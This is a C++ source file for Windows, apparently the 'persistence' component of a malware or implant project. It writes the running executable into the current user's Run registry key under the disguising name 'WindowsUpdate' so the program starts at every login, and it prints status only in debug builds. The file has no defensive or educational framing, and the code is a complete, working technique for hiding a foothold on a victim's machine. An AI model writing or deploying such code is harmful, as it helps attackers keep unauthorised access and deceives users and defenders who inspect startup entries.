#include "persistence.h"
#include <windows.h>
#include <shlobj.h>
#include <iostream>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

namespace Persistence {

// Get the full path of the current executable
std::string GetExecutablePath() {
    char path[MAX_PATH];
    DWORD result = GetModuleFileNameA(NULL, path, MAX_PATH);
    
    if (result == 0 || result == MAX_PATH) {
        return "";
    }
    
    return std::string(path);
}

// Get just the executable name from the full path
std::string GetExecutableName() {
    std::string fullPath = GetExecutablePath();
    
    size_t lastSlash = fullPath.find_last_of("\\/");
    if (lastSlash != std::string::npos) {
        return fullPath.substr(lastSlash + 1);
    }
    
    return fullPath;
}

// Add current executable to Windows Run registry key for HKEY_CURRENT_USER
bool AddToStartup() {
    HKEY hKey;
    const char* regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    
    // Open the registry key
    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, regPath, 0, KEY_SET_VALUE, &hKey);
    
    if (result != ERROR_SUCCESS) {
#ifdef _DEBUG
        std::cerr << "[-] Failed to open registry key. Error: " << result << std::endl;
#endif
        return false;
    }
    
    // Get the executable path
    std::string exePath = GetExecutablePath();
    if (exePath.empty()) {
#ifdef _DEBUG
        std::cerr << "[-] Failed to get executable path" << std::endl;
#endif
        RegCloseKey(hKey);
        return false;
    }
    
    // Use a generic name for the registry value
    const char* valueName = "WindowsUpdate";
    
    // Set the registry value
    result = RegSetValueExA(
        hKey,
        valueName,
        0,
        REG_SZ,
        (const BYTE*)exePath.c_str(),
        (DWORD)(exePath.length() + 1)
    );
    
    RegCloseKey(hKey);
    
    if (result != ERROR_SUCCESS) {
#ifdef _DEBUG
        std::cerr << "[-] Failed to set registry value. Error: " << result << std::endl;
#endif
        return false;
    }
    
#ifdef _DEBUG
    std::cout << "[+] Successfully added to startup: " << exePath << std::endl;
#endif
    
    return true;
}

// Remove current executable from Windows Run registry key
bool RemoveFromStartup() {
    HKEY hKey;
    const char* regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char* valueName = "WindowsUpdate";
    
    // Open the registry key
    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, regPath, 0, KEY_SET_VALUE, &hKey);
    
    if (result != ERROR_SUCCESS) {
        return false;
    }
    
    // Delete the registry value
    result = RegDeleteValueA(hKey, valueName);
    RegCloseKey(hKey);
    
    return (result == ERROR_SUCCESS);
}

} // namespace Persistence
